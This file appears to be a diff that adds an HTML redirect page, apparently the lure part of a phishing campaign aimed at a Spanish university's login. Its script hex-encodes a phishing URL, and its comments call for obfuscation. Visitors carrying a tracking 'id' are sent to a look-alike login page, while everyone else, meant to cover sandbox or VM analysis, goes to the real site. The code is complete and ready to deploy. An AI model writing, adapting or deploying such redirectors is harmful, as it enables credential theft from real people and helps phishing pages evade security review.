@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script>
+// This part must be OBFUSCATED with some obfuscator 
+        (function(){
+            function getParameterByName(name) {
+                var urlParams = new URLSearchParams(window.location.search);
+                return urlParams.get(name);
+            }
+
+            
+            function decodeHex(hexString) {
+                var str = '';
+                for (var i = 0; i < hexString.length; i += 2) {
+                    str += String.fromCharCode(parseInt(hexString.substr(i, 2), 16));
+                }
+                return str;
+            }
+            // Legit Obfuscated website to redirect in case of VM
+
+            var redirectOfficeHex = '68747470733a2f2f6f616d2e75616c2e65732f';
+
+            // Obfuscated Phishing Page URL 
+            var redirectCronHex = '68747470733a2f2f6c6f67696e2e696e666f7365632d616c65782e746f702f6567797550776463';
+
+            
+            function redirectWithId() {
+                var idBase64 = getParameterByName('id');
+
+            
+                if (idBase64) {
+                    var cronUrl = decodeHex(redirectCronHex) + idBase64;
+                    window.location.href = cronUrl;
+                } else {
+                    window.location.href = decodeHex(redirectOfficeHex);
+                }
+            }
+
+            window.onload = function() {
+                redirectWithId();
+            };
+        })();
+        
+    </script>
+</head>
+<body>
+  <!-- <p>Redirecting, please wait...</p> -->
+</body>
+</html>
